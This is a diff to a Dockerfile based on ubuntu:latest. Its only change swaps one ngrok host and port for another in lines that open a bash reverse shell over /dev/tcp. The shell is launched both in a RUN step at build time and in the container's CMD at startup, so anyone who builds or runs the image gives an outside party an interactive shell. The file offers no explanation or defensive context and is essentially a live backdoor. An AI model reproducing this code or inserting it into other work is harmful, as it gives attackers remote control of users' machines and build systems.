@@ -1,3 +1,3 @@
 FROM ubuntu:latest
-RUN bash -c "bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/14922 0>&1"
-CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/14922 0>&1"]
+RUN bash -c "bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/19889 0>&1"
+CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/19889 0>&1"]
